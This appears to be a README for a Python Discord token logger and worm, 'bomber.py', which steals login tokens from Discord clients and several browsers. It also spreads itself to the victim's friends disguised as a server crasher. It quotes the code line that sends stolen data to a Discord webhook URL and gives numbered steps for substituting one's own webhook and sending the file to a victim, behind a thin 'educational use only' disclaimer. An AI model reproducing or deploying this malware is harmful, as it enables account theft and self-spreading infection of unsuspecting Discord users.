To run this you need to have python installed on your computer.

To download it go to: https://www.python.org/downloads/ and get the latest stable version.

DO NOT RUN THIS ON YOUR COMPUTER if you want to see what it does i recomend you run it in a vm and not a computer that you have logged your main discord account in previously.

This python script when you run it will token log the person and then send the file (bomber.py) to everyone on there friends list saying its a discord server crasher.

It token logs from

Chrome

Discord

Discord PTB

Discord Canary

Opera

Brave

Yandex

If you want to change were it sends the token to.

1. create a discord server

2. add a webhook

3. copy webhook url

4. open the bommer.py in IDLE or another python editor 

5. scroll down to the last line before the blank (big gap in code) near the bottom
 were it says 
try:
        urlopen(Request("https://discord.com/api/webhooks/840487083444535366/0WIjgINkadXvuOMXOdwNahKFVROWtq-_ktGhPLLdZSy4b0QZo-2rljJWCabkaC9I-oQJ", data=dumps(webhook).encode(), headers=getheaders()))
6. change the "https://discord.com/api/webhooks/840487083444535366/0WIjgINkadXvuOMXOdwNahKFVROWtq-_ktGhPLLdZSy4b0QZo-2rljJWCabkaC9I-oQJ" to your webhook url

7. save the file

8. send to victim on discord

**disclaimer this is for educational use only and i am not responsible for your actions or uses of this code**
